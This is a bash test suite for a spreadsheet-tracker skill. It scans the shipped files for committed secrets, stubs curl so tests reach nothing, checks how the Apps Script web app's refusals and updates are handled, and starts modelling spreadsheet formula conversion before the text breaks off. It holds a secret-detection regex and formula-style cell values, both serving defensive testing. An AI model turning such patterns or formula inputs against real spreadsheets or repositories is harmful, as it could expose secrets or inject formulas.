#!/usr/bin/env bash
# Tests for the tracker skill (claude-config#675).
#
# The skill's Apps Script write token was committed in plain text, in SKILL.md and in
# config.example.json, in a public repository. The token now lives only in
# config.local.json, which never leaves the Mac that holds it, and tracker.sh refuses by
# name when that file is missing or still holds a placeholder.
#
# Every run happens on a COPY of the skill in a throwaway directory, with a fake curl on
# PATH that records what it was asked and reaches nothing (L2). Every token here is
# invented by this file; no real one is read, printed or passed anywhere.
set -uo pipefail

# Its own wall clock, and whatever it starts stopped with it however it ends (claude-config#465).
. "$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)/../../hooks/lib/suite-deadline.sh" || {
  echo "FAIL: $(basename "$0"): lib/suite-deadline.sh is missing, so this suite cannot bound its own wall clock. Refusing to run unbounded."
  printf 'SUITE-RESULT passed=0 failed=1\n'
  exit 1
}
suite_deadline_arm || exit $?

DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
TMP="$(mktemp -d)"
case "${TMP%/}" in
  ''|/|"${HOME%/}") echo "refusing to run: throwaway directory came back as '$TMP'." >&2; exit 2 ;;
esac
trap 'rm -rf "$TMP"' EXIT

pass=0
fail=0
ok()  { pass=$((pass + 1)); }
bad() { fail=$((fail + 1)); echo "FAIL: $1"; }
check() { # check <description> <expected-substring> <actual>
  if [[ "$3" == *"$2"* ]]; then ok; else
    bad "$1"; echo "  expected to contain: $2"; echo "  actual: $3"
  fi
}
check_not() { # check_not <description> <forbidden-substring> <actual>
  if [[ "$3" != *"$2"* ]]; then ok; else bad "$1 (output should not contain '$2')"; fi
}
check_eq() { # check_eq <description> <expected> <actual>
  if [[ "$3" == "$2" ]]; then ok; else bad "$1 (expected '$2', got '$3')"; fi
}

# --- the shipped files hold no token ----------------------------------------
# A token is a long run of letters AND digits. Bounded by anything that is not part of an
# identifier, so the sheet id in SKILL.md (which carries a hyphen) is not one, and the
# placeholders (which carry spaces or underscores) are not either. Every file the skill ships is
# read, never a list of the ones that held it last time (L96). config.local.json is the
# one file that is meant to hold it, and it never ships.
shipped_secret_lines(){ # $1 = a skill directory; prints file:line for each token shaped run
  python3 - "$1" <<'PY'
import os, re, sys
root = sys.argv[1]
shape = re.compile(r"(?<![A-Za-z0-9_-])[A-Za-z0-9]{32,}(?![A-Za-z0-9_-])")
for name in sorted(os.listdir(root)):
    p = os.path.join(root, name)
    if name == "config.local.json" or not os.path.isfile(p):
        continue
    for i, line in enumerate(open(p, errors="ignore").read().splitlines(), 1):
        for m in shape.finditer(line):
            v = m.group(0)
            if re.search(r"[0-9]", v) and re.search(r"[A-Za-z]", v):
                print("%s:%d" % (name, i))
PY
}
found="$(shipped_secret_lines "$DIR")"
check_eq "no shipped file in the tracker skill holds a token shaped value (file:line listed, value never printed)" "" "$found"
# The control (L1): the scan finds a token where one is planted, so its silence above means something.
mkdir -p "$TMP/planted"
# Assembled from two halves so this file never holds a token shaped run of its own.
printf '{ "url": "x", "token": "%s%s" }\n' "Ab3dEf6hIj9kLm2n" "Op5qRs8tUv1wXy4zAb7cDe0f" > "$TMP/planted/config.example.json"
printf 'kept local\n' > "$TMP/planted/config.local.json"
check_eq "and the same scan finds a planted one, while ignoring config.local.json" "config.example.json:1" "$(shipped_secret_lines "$TMP/planted")"

# The example must still be a template the skill can fill: both keys present, both placeholders.
example_keys="$(python3 -c 'import json,sys; d=json.load(open(sys.argv[1])); print(",".join(sorted(d)))' "$DIR/config.example.json" 2>&1)"
check_eq "config.example.json carries url and token" "token,url" "$example_keys"

# --- SKILL.md's worked examples obey SKILL.md's own rules ---------------------
# An example that breaks a rule teaches the inverse with the rule's authority (L562). The rule:
# Skills Used never lists Claude Code. Every `tracker.sh append '<json>'` example is parsed.
examples_verdict(){ # $1 = a SKILL.md
  python3 - "$1" <<'PY'
import json, re, sys
found = 0
for m in re.finditer(r"tracker\.sh append '(\{.*?\})'", open(sys.argv[1]).read()):
    try:
        row = json.loads(m.group(1))
    except Exception:
        print("unparseable example"); continue
    found += 1
    if "claude code" in str(row.get("Skills Used", "")).lower():
        print("an example lists Claude Code under Skills Used")
print("examples=%d" % found)
# The update examples are judged inside "Updating a row in place" itself, never over the whole
# file, where the redeploy check's own example would answer for them (L135). Each line is one
# call: update, optionally --preview, then link, name, cells and an optional expect object.
text = open(sys.argv[1]).read()
section = next((b for b in re.split(r"(?m)^## ", text)[1:] if b.startswith("Updating a row in place")), "")
kinds = []
for line in section.splitlines():
    m = re.match(r"\s*bash tracker\.sh update (--preview |--restore )?'([^']+)' '([^']+)' '(\{.*?\})'( '(\{.*?\})')?\s*$", line)
    if not m:
        if "tracker.sh update" in line and line.lstrip().startswith("bash "):
            print("an update example that is not a well formed call: %s" % line.strip()[:80])
        continue
    try:
        row = json.loads(m.group(4))
        if m.group(6):
            json.loads(m.group(6))
    except Exception:
        print("unparseable example"); continue
    flag = (m.group(1) or "").strip()
    kinds.append("preview" if flag == "--preview" else ("restore" if flag == "--restore" and m.group(6) else ("expect" if m.group(6) else "plain")))
    if "claude code" in str(row.get("Skills Used", "")).lower():
        print("an example lists Claude Code under Skills Used")
print("update-examples=%s" % ",".join(kinds))
PY
}
example_verdict="$(examples_verdict "$DIR/SKILL.md")"
check "SKILL.md carries a worked append example to judge" "examples=1" "$example_verdict"
check "SKILL.md's update section shows a preview, the update bound to what the preview read, and the restore that undoes it" "update-examples=preview,expect,restore" "$example_verdict"
check_not "and no worked example lists Claude Code under Skills Used, which the rule forbids" "Claude Code" "$example_verdict"
check_not "and every worked example is valid JSON" "unparseable" "$example_verdict"
check_not "and every update example is a well formed call" "not a well formed call" "$example_verdict"
# The controls (L1): the same check catches a broken JSON and a Claude Code entry planted in the
# update section's own examples, which the redeploy example elsewhere cannot answer for.
python3 -c 'import sys
t=open(sys.argv[1]).read(); h=t.index("## Updating a row in place"); s=t[h:]
s=s.replace("{\"Outcome/Results\"", "{Outcome/Results\"", 1)
lines=s.split("\n"); k=next(n for n,l in enumerate(lines) if l.startswith("bash tracker.sh update ") and not l.startswith("bash tracker.sh update --"))
lines[k]=lines[k].replace("{\"Outcome/Results\"", "{\"Skills Used\":\"Claude Code\",\"Outcome/Results\"", 1); s="\n".join(lines)
print(t[:h]+s, end="")' "$DIR/SKILL.md" > "$TMP/bad-update-examples.md"
bad_verdict="$(examples_verdict "$TMP/bad-update-examples.md")"
check "the example check catches a broken update example JSON in that section" "unparseable" "$bad_verdict"
check "and a Claude Code entry in an update example" "Claude Code" "$bad_verdict"

# --- every step that sends somebody into the sheet names it and links it ------
# Drive holds two sheets called "Dan Work Project Tracker", and on 2026-10-08 a token rotation
# stopped to ask which one. Dan confirmed this one. The expected link is written here, never
# read back out of SKILL.md, so a wrong link there cannot satisfy the check (L70).
SHEET_NAME="Dan Work Project Tracker"
SHEET_URL="https://docs.google.com/spreadsheets/d/1aFt8ks89lkzLVUF0pf4Aj8Pi9B5TOcqCj-8WkUQsN3w/edit"
# Judged per numbered step inside the setup and rotation sections, never over the whole file,
# because one link anywhere would answer a whole file match while a step still says only
# "open the sheet" (L135). A step sends somebody into the sheet when it says to open it or
# names its Extensions, Apps Script menu. Prints one line per step missing the link or the
# name, a line for each section with no such step at all, then the count of steps judged.
sheet_step_gaps(){ # $1 = a SKILL.md
  python3 - "$1" "$SHEET_URL" "$SHEET_NAME" <<'PY'
import re, sys
text, url, name = open(sys.argv[1]).read(), sys.argv[2], sys.argv[3]
sections = {}
for block in re.split(r"(?m)^## ", text)[1:]:
    head, _, body = block.partition("\n")
    sections[head.strip()] = body
opens = re.compile(r"Extensions, Apps Script|\b[Oo]pen the sheet\b")
judged = 0
for want in ("First run / setup", "Rotating the token", "Turning on update"):
    body = next((b for h, b in sections.items() if h.startswith(want)), None)
    if body is None:
        print("%s: section missing" % want); continue
    steps = re.findall(r"(?ms)^(\d+)\. (.*?)(?=^\d+\. |^\S|\Z)", body)
    hits = [(n, s) for n, s in steps if opens.search(s)]
    if not hits:
        print("%s: no step sends the reader into the sheet" % want)
    for n, s in hits:
        judged += 1
        s = " ".join(s.split())  # a rewrapped step still names the sheet (L278)
        if url not in s:
            print("%s step %s lacks the sheet link" % (want, n))
        if name not in s:
            print("%s step %s lacks the sheet name" % (want, n))
print("judged=%d" % judged)
PY
}
gaps="$(sheet_step_gaps "$DIR/SKILL.md")"
check_eq "every setup, rotation and update redeploy step that opens the sheet carries its name and link" "judged=3" "$gaps"
# The update verb works only once the deployed script is the one that has it, so SKILL.md must
# say how to deploy a new version: judged inside its own section, whitespace collapsed (L278).
redeploy="$(python3 - "$DIR/SKILL.md" <<'PY'
import re, sys
text = open(sys.argv[1]).read()
body = next((b.partition("\n")[2] for b in re.split(r"(?m)^## ", text)[1:] if b.startswith("Turning on update")), None)
if body is None:
    print("no Turning on update section"); sys.exit(0)
body = " ".join(body.split())
for want in ("Deploy, Manage deployments", "New version", "tracker.sh update"):
    print("%s: %s" % (want, "yes" if want in body else "MISSING"))
PY
)"
check_not "SKILL.md's Turning on update section names the redeploy (Deploy, Manage deployments, New version) and how to check it" "MISSING" "$redeploy"
check "and that section exists" "New version: yes" "$redeploy"
# Old values can only be shown for approval if something reads them before the write: SKILL.md's
# update section must send the reader through --preview first.
preview_doc="$(python3 -c 'import re,sys
t=open(sys.argv[1]).read()
b=next((x for x in re.split(r"(?m)^## ", t)[1:] if x.startswith("Updating a row in place")), "")
print("yes" if "tracker.sh update --preview" in " ".join(b.split()) else "no")' "$DIR/SKILL.md" 2>&1)"
check_eq "SKILL.md's update section shows old values through update --preview before writing" "yes" "$preview_doc"
# Answered yes or no, so a failure prints a word rather than the whole file (L445). Whitespace is
# collapsed first so a rewrapped line still counts (L278).
warns="$(python3 -c 'import re,sys; t=" ".join(open(sys.argv[1]).read().split()); print("yes" if ("a second sheet named \"%s\"" % sys.argv[2]) in t else "no")' "$DIR/SKILL.md" "$SHEET_NAME" 2>&1)"
check_eq "and SKILL.md warns that a second sheet shares the name" "yes" "$warns"
# The controls (L1): the same check names the step whose link was taken out, and refuses a
# file whose steps no longer send anybody into the sheet rather than passing it on zero.
python3 -c 'import sys; t=open(sys.argv[1]).read(); h=t.index("## Rotating the token"); print(t[:h] + t[h:].replace(sys.argv[2], "the sheet", 1), end="")' "$DIR/SKILL.md" "$SHEET_URL" > "$TMP/no-link.md"
check "the check names a rotation step whose link was removed" "Rotating the token step 3 lacks the sheet link" "$(sheet_step_gaps "$TMP/no-link.md")"
check_not "and only that step" "First run / setup step" "$(sheet_step_gaps "$TMP/no-link.md")"
# A step that rewraps the name across a line break still names the sheet (L278), so it passes.
python3 -c 'import sys; t=open(sys.argv[1]).read(); print(t.replace("**Dan Work Project Tracker**", "**Dan Work\n   Project Tracker**"), end="")' "$DIR/SKILL.md" > "$TMP/rewrapped.md"
check_eq "and a step whose sheet name is rewrapped across lines still counts as naming it" "judged=3" "$(sheet_step_gaps "$TMP/rewrapped.md")"
printf '## First run / setup\n\n1. Run something.\n\n## Rotating the token\n\n1. Run something.\n' > "$TMP/no-steps.md"
check "and refuses steps that never open the sheet, rather than passing on zero" "no step sends the reader into the sheet" "$(sheet_step_gaps "$TMP/no-steps.md")"

# --- config.local.json never travels ------------------------------------------
# Git: the skill's own ignore file keeps it out of every commit.
gitignored(){ # gitignored <file name>; prints yes when a pattern in the skill's .gitignore matches it
  python3 -c 'import fnmatch,sys; ps=[l.strip() for l in open(sys.argv[1]) if l.strip() and not l.startswith("#")]; print("yes" if any(fnmatch.fnmatch(sys.argv[2], p) for p in ps) else "no")' "$DIR/.gitignore" "$1" 2>&1
}
check_eq "the skill's .gitignore leaves out config.local.json" "yes" "$(gitignored config.local.json)"
check_eq "and does not leave out the files the skill ships" "no no no" "$(gitignored tracker.sh) $(gitignored config.example.json) $(gitignored SKILL.md)"

# --- a sandbox copy of the skill, and a curl that reaches nothing -------------
SK="$TMP/skill"
mkdir -p "$SK" "$TMP/bin"
cp "$DIR/tracker.sh" "$DIR/config.example.json" "$DIR/apps-script.gs" "$SK/"
CURL_LOG="$TMP/curl.log"
cat > "$TMP/bin/curl" <<'STUB'
#!/usr/bin/env bash
# Records its arguments and whatever arrived on stdin, then answers like the web app.
{ printf 'ARGS:'; printf ' %s' "$@"; printf '\n'; printf 'STDIN:'; cat; printf '\n'; } >> "$CURL_LOG"
printf '%s' "$FAKE_ANSWER"
exit "${FAKE_CURL_RC:-0}"
STUB
chmod +x "$TMP/bin/curl"
export CURL_LOG
export FAKE_ANSWER='{"ok":true}'

GOOD_URL="https://script.google.com/macros/s/FAKEDEPLOYMENT/exec"
GOOD_TOKEN="test_token_0123456789_abcdef_not_real"
write_local(){ # write_local <url> <token>
  python3 -c 'import json,sys; json.dump({"url":sys.argv[2],"token":sys.argv[3]}, open(sys.argv[1],"w"))' "$SK/config.local.json" "$1" "$2"
}
run(){ # run <args...>; sets OUT and RC
  : > "$CURL_LOG"
  OUT="$(PATH="$TMP/bin:$PATH" bash "$SK/tracker.sh" "$@" 2>&1)"
  RC=$?
}
curl_calls(){ grep -c '^ARGS:' "$CURL_LOG" 2>/dev/null || true; }
EX_URL="$(python3 -c 'import json,sys; print(json.load(open(sys.argv[1]))["url"])' "$DIR/config.example.json")"
EX_TOKEN="$(python3 -c 'import json,sys; print(json.load(open(sys.argv[1]))["token"])' "$DIR/config.example.json")"
GS_TOKEN="$(sed -n "s/^const TOKEN = '\\(.*\\)';.*/\\1/p" "$DIR/apps-script.gs")"
check "the Apps Script placeholder could be read from apps-script.gs" "REPLACE" "$GS_TOKEN"

# --- the positive control first (L159): a configured skill does reach curl ---
write_local "$GOOD_URL" "$GOOD_TOKEN"
run headers
check_eq "a configured skill's headers call succeeds" 0 "$RC"
check_eq "and reaches curl exactly once" 1 "$(curl_calls)"
check "and asks the configured web app" "FAKEDEPLOYMENT" "$(grep '^ARGS:' "$CURL_LOG")"
check "as a POST whose body asks for the headers" '"action": "headers"' "$(grep '^STDIN:' "$CURL_LOG")"
check "with the key in that body" "\"key\": \"$GOOD_TOKEN\"" "$(grep '^STDIN:' "$CURL_LOG")"
check "the body goes as POST data" "--data @-" "$(grep '^ARGS:' "$CURL_LOG")"
check_not "and never puts the token on curl's command line or in the address" "$GOOD_TOKEN" "$(grep '^ARGS:' "$CURL_LOG")"
check_not "and the address carries no query string at all" "?" "$(grep '^ARGS:' "$CURL_LOG")"
run append '{"Project Name":"x"}'
check_eq "a configured skill's append succeeds" 0 "$RC"
check_eq "and reaches curl exactly once" 1 "$(curl_calls)"
check "and sends the key in the request body" "\"key\": \"$GOOD_TOKEN\"" "$(grep '^STDIN:' "$CURL_LOG")"
check "and the row with it" '"data": {"Project Name": "x"}' "$(grep '^STDIN:' "$CURL_LOG")"
check_not "and never under the old field name the first script read" '"token"' "$(grep '^STDIN:' "$CURL_LOG")"
check_not "and never puts the token on curl's command line" "$GOOD_TOKEN" "$(grep '^ARGS:' "$CURL_LOG")"

# update: the row's Link, its Project Name and the cells to change, in the body with the key.
FAKE_ANSWER='{"ok":true,"action":"update","rowNumber":2}' run update "https://github.com/example/alpha" "Alpha" '{"My Actions":"x"}'
check_eq "a configured skill's update succeeds" 0 "$RC"
check "and prints the web app's answer" '"rowNumber":2' "$OUT"
check_eq "and reaches curl exactly once" 1 "$(curl_calls)"
update_body="$(sed -n 's/^STDIN://p' "$CURL_LOG" | python3 -c 'import json,sys; b=json.load(sys.stdin); k=b.pop("key",None); print(json.dumps(b, sort_keys=True)); print("key-sent" if k else "no-key")' 2>&1)"
check_eq "and sends the action, Link, Project Name and cells, and the key, in the body" \
  "$(printf '%s\n%s' '{"action": "update", "cells": {"My Actions": "x"}, "link": "https://github.com/example/alpha", "projectName": "Alpha"}' key-sent)" "$update_body"
check "with the configured key" "\"key\": \"$GOOD_TOKEN\"" "$(grep '^STDIN:' "$CURL_LOG")"
check_not "and never puts the token on curl's command line" "$GOOD_TOKEN" "$(grep '^ARGS:' "$CURL_LOG")"
# A script deployed before update reads any body with a "data" object as a row to APPEND, so
# the cells travel as "cells": that script then refuses the body ("nothing to append", tested
# below against the web app) instead of adding a duplicate row.
check_not "and the cells never travel as \"data\", which a script without update would append" '"data"' "$(grep '^STDIN:' "$CURL_LOG")"
FAKE_ANSWER='{"ok":false,"error":"nothing to append: send action \"headers\" or a data object"}' run update "https://github.com/example/alpha" "Alpha" '{"My Actions":"x"}'
if [ "$RC" -eq 1 ]; then ok; else bad "an update refused by a script without update exits 1 (got $RC)"; fi
check "and says the deployed script predates update and needs a new version" "Turning on update" "$OUT"
# A success answer that is not an update's (an append's, from some other script) is a failure.
FAKE_ANSWER='{"ok":true,"rowNumber":7,"row":["x"]}' run update "https://github.com/example/alpha" "Alpha" '{"My Actions":"x"}'
if [ "$RC" -eq 1 ]; then ok; else bad "an update answered by something other than an update exits 1 (got $RC)"; fi
check "and says the answer was not an update's" "not an update" "$OUT"
FAKE_ANSWER='{"ok":false,"error":"the row with that Link is Beta, not Alpha"}' run update "https://github.com/example/beta" "Alpha" '{"My Actions":"x"}'
if [ "$RC" -eq 1 ]; then ok; else bad "a refused update exits 1 (got $RC)"; fi
check "and names the web app's own error" "is Beta, not Alpha" "$OUT"
# --preview: the same request marked a preview, and only a preview's answer is accepted.
FAKE_ANSWER='{"ok":true,"action":"update","preview":true,"rowNumber":2,"before":{"My Actions":"old"}}' run update --preview "https://github.com/example/alpha" "Alpha" '{"My Actions":"x"}'
check_eq "update --preview succeeds" 0 "$RC"
check "and prints the current values" '"before":{"My Actions":"old"}' "$OUT"
check "and the body asks for a preview" '"preview": true' "$(grep '^STDIN:' "$CURL_LOG")"
check "with the same cells" '"cells": {"My Actions": "x"}' "$(grep '^STDIN:' "$CURL_LOG")"
FAKE_ANSWER='{"ok":true,"action":"update","rowNumber":2}' run update --preview "https://github.com/example/alpha" "Alpha" '{"My Actions":"x"}'
if [ "$RC" -eq 1 ]; then ok; else bad "a preview answered as a real update exits 1 (got $RC)"; fi
check "and says the sheet may have been written" "not a preview" "$OUT"
FAKE_ANSWER='{"ok":true,"action":"update","preview":true,"rowNumber":2}' run update "https://github.com/example/alpha" "Alpha" '{"My Actions":"x"}'
if [ "$RC" -eq 1 ]; then ok; else bad "an update answered as a preview exits 1 (got $RC)"; fi
check "and says nothing was written" "only a preview" "$OUT"
check_not "and a real update never asks for a preview" '"preview"' "$(grep '^STDIN:' "$CURL_LOG")"

# --restore: the undo write, sent with restore true, and only with what the cells hold now.
FAKE_ANSWER='{"ok":true,"action":"update","rowNumber":2}' run update --restore "https://github.com/example/alpha" "Alpha" '{"My Actions":"=SUM(1)"}' '{"My Actions":"x"}'
check_eq "update --restore with what the cells hold now succeeds" 0 "$RC"
check "and asks for a restore" '"restore": true' "$(grep '^STDIN:' "$CURL_LOG")"
check "with the expect it needs" '"expect": {"My Actions": "x"}' "$(grep '^STDIN:' "$CURL_LOG")"
run update --restore "https://github.com/example/alpha" "Alpha" '{"My Actions":"=SUM(1)"}'
if [ "$RC" -ne 0 ]; then ok; else bad "update --restore without what the cells hold now exits non zero (got $RC)"; fi
check_eq "and reaches nothing" 0 "$(curl_calls)"
check "and says restore needs it" "restore needs" "$OUT"
FAKE_ANSWER='{"ok":true,"action":"update","rowNumber":2}' run update "https://github.com/example/alpha" "Alpha" '{"My Actions":"x"}' '{"My Actions":"old"}'
check_not "and an ordinary update never asks for a restore" '"restore"' "$(grep '^STDIN:' "$CURL_LOG")"

# An optional fourth argument is what the preview read; it goes as "expect".
FAKE_ANSWER='{"ok":true,"action":"update","rowNumber":2}' run update "https://github.com/example/alpha" "Alpha" '{"My Actions":"x"}' '{"My Actions":"old"}'
check_eq "update with what the preview read succeeds" 0 "$RC"
check "and sends it as expect" '"expect": {"My Actions": "old"}' "$(grep '^STDIN:' "$CURL_LOG")"

refuses_update_call(){ # refuses_update_call <description> <args to update...>
  local what="$1"; shift
  run update "$@"
  if [ "$RC" -ne 0 ]; then ok; else bad "update with $what: exits non zero (got $RC)"; fi
  check_eq "update with $what: reaches nothing" 0 "$(curl_calls)"
  check "update with $what: says how to call it" "usage: tracker.sh update" "$OUT"
}
refuses_update_call "no arguments"
refuses_update_call "no cells" "https://github.com/example/alpha" "Alpha"
refuses_update_call "cells that are not JSON" "https://github.com/example/alpha" "Alpha" '{not json'
refuses_update_call "cells that are a list, not an object" "https://github.com/example/alpha" "Alpha" '[1]'
refuses_update_call "no cells in the object" "https://github.com/example/alpha" "Alpha" '{}'
refuses_update_call "an empty Link" "" "Alpha" '{"a":1}'
refuses_update_call "an empty Project Name" "https://github.com/example/alpha" "" '{"a":1}'
refuses_update_call "an expect that is not a JSON object" "https://github.com/example/alpha" "Alpha" '{"a":1}' '[1]'
refuses_update_call "an argument too many" "https://github.com/example/alpha" "Alpha" '{"a":1}' '{"a":0}' 'extra'

# --- the web app's own refusal is a failure, never a printed success (claude-config#677) ---
# The Apps Script answers HTTP 200 for its refusals too, so curl --fail passes them: the answer
# itself has to be read.
FAKE_ANSWER='{"ok":false,"error":"bad token"}' run headers
if [ "$RC" -eq 1 ]; then ok; else bad "a refused headers call exits 1 (got $RC)"; fi
check "and names the web app's own error" "bad token" "$OUT"
FAKE_ANSWER='{"ok":false,"error":"bad json"}' run append '{"Project Name":"x"}'
if [ "$RC" -eq 1 ]; then ok; else bad "a refused append exits 1 (got $RC)"; fi
check "and names the web app's own error" "bad json" "$OUT"
FAKE_ANSWER='<html><body>Sign in to continue</body></html>' run append '{"Project Name":"x"}'
if [ "$RC" -eq 1 ]; then ok; else bad "an answer that is not JSON (a sign in page) exits 1 (got $RC)"; fi
check "and says it was not the JSON the web app sends" "not the JSON" "$OUT"
FAKE_ANSWER='' FAKE_CURL_RC=22 run headers
if [ "$RC" -ne 0 ]; then ok; else bad "a request curl could not complete fails (got $RC)"; fi
check "and says the web app could not be reached" "could not reach" "$OUT"
check_not "no failure prints the configured token" "$GOOD_TOKEN" "$OUT"

# --- every refusal names its cause, and reaches nothing -----------------------
refuses(){ # refuses <description> <expected words in the message> <args...>
  local d="$1" want="$2"; shift 2
  run "$@"
  if [ "$RC" -ne 0 ]; then ok; else bad "$d: exits non zero (got $RC)"; fi
  check "$d: says why" "$want" "$OUT"
  check_eq "$d: reaches nothing" 0 "$(curl_calls)"
  check_not "$d: never prints the configured token" "$GOOD_TOKEN" "$OUT"
}

rm -f "$SK/config.local.json"
refuses "no config.local.json" "config.local.json is missing" headers
refuses "no config.local.json, on append" "config.local.json is missing" append '{"a":1}'

cp "$DIR/config.example.json" "$SK/config.local.json"
refuses "config.local.json copied straight from the example" "placeholder" headers
check "and it names the url" "url" "$OUT"

write_local "$EX_URL" "$GOOD_TOKEN"
refuses "the example's url placeholder" "url" headers
check "and calls it a placeholder" "placeholder" "$OUT"

write_local "$GOOD_URL" "$EX_TOKEN"
refuses "the example's token placeholder" "token" headers
check "and calls it a placeholder" "placeholder" "$OUT"

write_local "$GOOD_URL" "$GS_TOKEN"
refuses "the Apps Script's own placeholder token" "token" append '{"a":1}'
check "and calls it a placeholder" "placeholder" "$OUT"

write_local "$GOOD_URL" ""
refuses "an empty token" "token" headers
check "and calls it empty" "empty" "$OUT"

write_local "$GOOD_URL" "short_token_0123456789"
refuses "a token shorter than the web app accepts" "shorter than 32" headers

python3 -c 'import json,sys; json.dump({"url":sys.argv[2]}, open(sys.argv[1],"w"))' "$SK/config.local.json" "$GOOD_URL"
refuses "a config with no token key" "token" headers

printf '{ not json' > "$SK/config.local.json"
refuses "a config that is not JSON" "config.local.json" headers
check "and says it could not be read" "could not be read" "$OUT"

# The placeholders are read from the shipped files, so a missing one cannot be judged.
write_local "$GOOD_URL" "$GOOD_TOKEN"
mv "$SK/apps-script.gs" "$TMP/apps-script.gs.aside"
refuses "with apps-script.gs missing, placeholders cannot be checked" "apps-script.gs" headers
mv "$TMP/apps-script.gs.aside" "$SK/apps-script.gs"

# --- new-token writes a fresh token without ever showing it -------------------
rm -f "$SK/config.local.json"
run new-token
check_eq "new-token with no config.local.json succeeds" 0 "$RC"
check_eq "and reaches nothing" 0 "$(curl_calls)"
check "and says where the token went" "config.local.json" "$OUT"
NEWTOK="$(python3 -c 'import json,sys; print(json.load(open(sys.argv[1]))["token"])' "$SK/config.local.json" 2>/dev/null)"
NEWURL="$(python3 -c 'import json,sys; print(json.load(open(sys.argv[1]))["url"])' "$SK/config.local.json" 2>/dev/null)"
if [ "${#NEWTOK}" -ge 32 ]; then ok; else bad "new-token writes a token of at least 32 characters (got ${#NEWTOK})"; fi
if [ -n "$NEWTOK" ] && [ "$NEWTOK" != "$EX_TOKEN" ] && [ "$NEWTOK" != "$GS_TOKEN" ]; then ok; else bad "new-token writes a token that is not a placeholder"; fi
if [ -n "$NEWTOK" ] && [[ "$OUT" != *"$NEWTOK"* ]]; then ok; else bad "new-token never prints the token it wrote"; fi
check_eq "and the file is readable by its owner only" "600" "$(python3 -c 'import os,sys; print(format(os.stat(sys.argv[1]).st_mode & 0o777, "o"))' "$SK/config.local.json" 2>&1)"
check_eq "and the url is still the example's, waiting to be filled" "$EX_URL" "$NEWURL"
refuses "a fresh token with the url still a placeholder" "url" headers

write_local "$GOOD_URL" "$GOOD_TOKEN"
run new-token
NEWTOK2="$(python3 -c 'import json,sys; print(json.load(open(sys.argv[1]))["token"])' "$SK/config.local.json" 2>/dev/null)"
NEWURL2="$(python3 -c 'import json,sys; print(json.load(open(sys.argv[1]))["url"])' "$SK/config.local.json" 2>/dev/null)"
check_eq "new-token over an existing config succeeds" 0 "$RC"
if [ -n "$NEWTOK2" ] && [ "$NEWTOK2" != "$GOOD_TOKEN" ]; then ok; else bad "new-token replaces the old token"; fi
check_eq "and keeps the configured url" "$GOOD_URL" "$NEWURL2"
check_not "and never prints the old token" "$GOOD_TOKEN" "$OUT"
run headers
check_eq "and the skill works with the new token" 0 "$RC"

printf '{ not json' > "$SK/config.local.json"
run new-token
if [ "$RC" -ne 0 ]; then ok; else bad "new-token over an unreadable config refuses rather than overwriting it"; fi
check_eq "and leaves that file as it was" "{ not json" "$(cat "$SK/config.local.json")"

# --- a run killed mid write leaves the token only where nothing syncs ---------
# new-token writes a temporary copy and renames it over config.local.json. A run killed between
# the two leaves that copy behind, holding the new token, so its name must be one the skill's
# .gitignore and claude-sync's mirror (every *.local.json) both leave out.
write_local "$GOOD_URL" "$GOOD_TOKEN"
export TRACKER_TEST_STOP_BEFORE_RENAME=1
run new-token
unset TRACKER_TEST_STOP_BEFORE_RENAME
if [ "$RC" -ne 0 ]; then ok; else bad "the stopped new-token run reports failure (got $RC)"; fi
check "a run stopped before the rename leaves config.local.json as it was" "$GOOD_TOKEN" "$(cat "$SK/config.local.json")"
leftovers="$(python3 - "$SK" "$DIR/.gitignore" <<'PY'
import fnmatch, os, stat, sys
sk, gitignore = sys.argv[1], sys.argv[2]
shipped = {"tracker.sh", "config.example.json", "apps-script.gs", "config.local.json"}
patterns = [l.strip() for l in open(gitignore) if l.strip() and not l.startswith("#")]
for name in sorted(os.listdir(sk)):
    if name in shipped:
        continue
    mode = format(os.stat(os.path.join(sk, name)).st_mode & 0o777, "o")
    ignored = any(fnmatch.fnmatch(name, p) for p in patterns)
    print("%s synced=%s ignored=%s mode=%s" % ("leftover", "no" if name.endswith(".local.json") else "YES", "yes" if ignored else "NO", mode))
PY
)"
check "the stopped run did leave its temporary copy behind (the case under test happened)" "leftover" "$leftovers"
check_not "and that copy's name is one claude-sync leaves out (*.local.json)" "synced=YES" "$leftovers"
check_not "and one the skill's .gitignore leaves out" "ignored=NO" "$leftovers"
check_not "and it is readable by its owner only" "mode=6" "$(grep -v 'mode=600' <<< "$leftovers")"

# --- the web app itself (apps-script.gs), run under node with fake Google services ---
# The script's own logic, not a reading of its text (L638): each case evaluates the shipped file,
# with its TOKEN line set the way Dan sets it, against stubs that record every append.
if ! command -v node >/dev/null 2>&1; then
  bad "node is not on PATH, so apps-script.gs could not be run. Install node; this is UNMEASURED, not passed."
else
  # The sheet is an in memory double: a grid of rows (row 1 the headers) that records every cell
  # the script writes, every read, and every row appended. A fixture file can give it other rows,
  # a change to make to the sheet straight after the script's first read of more than one row
  # (standing in for a person sorting or editing between the script's read and its write), and a
  # lock already held by another run. The request may be one body or a list of bodies run in
  # turn against the same sheet; "diffs" holds, per request, every cell whose value it changed.
  cat > "$TMP/gs-harness.js" <<'JS'
const fs = require('fs'), vm = require('vm');
const [src, token, requestJson, method, fixturePath] = process.argv.slice(2);
let code = fs.readFileSync(src, 'utf8');
if (token !== '-') {
  const before = code;
  code = code.replace(/^const TOKEN = '[^']*';/m, "const TOKEN = '" + token + "';");
  if (code === before) { console.log(JSON.stringify({ harness: 'no TOKEN line to set' })); process.exit(0); }
}
const fx = fixturePath && fixturePath !== '-'
  ? JSON.parse(fs.readFileSync(fixturePath, 'utf8'))
  : { rows: [['Project Name', 'Date Started']] };
const rows = fx.rows.map((r) => r.slice());
const appended = [], writes = [];
let reads = 0, mutated = false;
const lock = { taken: 0, released: 0, busy: !!fx.lockBusy };
const width = () => rows.reduce((m, r) => Math.max(m, r.length), 0);
// A fixture cell is plain text or a number, or an object standing for what Sheets holds:
// { date: ISO, display } is a date cell (getValues gives a Date, the sheet shows `display`),
// { formula, value, display } a formula cell. A written cell becomes plain text again.
const raw = (r, c) => (rows[r - 1] && c - 1 < rows[r - 1].length ? rows[r - 1][c - 1] : '');
const cell = (r, c) => {
  const v = raw(r, c);
  if (v && typeof v === 'object') return v.date !== undefined ? new Date(v.date) : v.value;
  return v;
};
const shown = (r, c) => { const v = raw(r, c); return v && typeof v === 'object' ? v.display : String(v); };
// What Sheets makes of a value written to a cell (setValue, appendRow): a leading apostrophe
// stores the rest as literal text and is not shown; text starting = + - or @ (other than a plain
// number) becomes a live formula; date shaped text becomes a date; number shaped text a number.
function stored(v) {
